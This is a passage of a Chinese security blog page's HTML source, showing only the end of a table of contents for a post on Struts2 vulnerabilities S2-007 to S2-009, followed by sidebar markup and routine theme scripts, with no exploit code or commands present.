S2-007</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-number">6.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-3"><span class="toc-number">6.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">6.3.</span> <span class="toc-text"> 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">6.3.1.</span> <span class="toc-text"> 漏洞检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-008"><span class="toc-number">7.</span> <span class="toc-text"> S2-008</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4"><span class="toc-number">7.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-4"><span class="toc-number">7.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%80cookie"><span class="toc-number">7.3.</span> <span class="toc-text"> 漏洞利用一（Cookie）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BA%8Cdebug"><span class="toc-number">7.4.</span> <span class="toc-text"> 漏洞利用二（debug）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-009"><span class="toc-number">8.</span> <span class="toc-text"> S2-009</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5"><span class="toc-number">8.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-5"><span class="toc-number">8.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">8.3.</span> <span class="toc-text"> 漏洞复现</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "JAVA安全-Structs2漏洞及复现",
+          url: "http://example.com/2025/08/13/JAVA-Struct2%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: " Structs2框架简述 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的",
+          date: "Wed Aug 13 2025 12:38:49 GMT+0800",
+          updated: "Sat Jan 24 2026 16:15:49 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
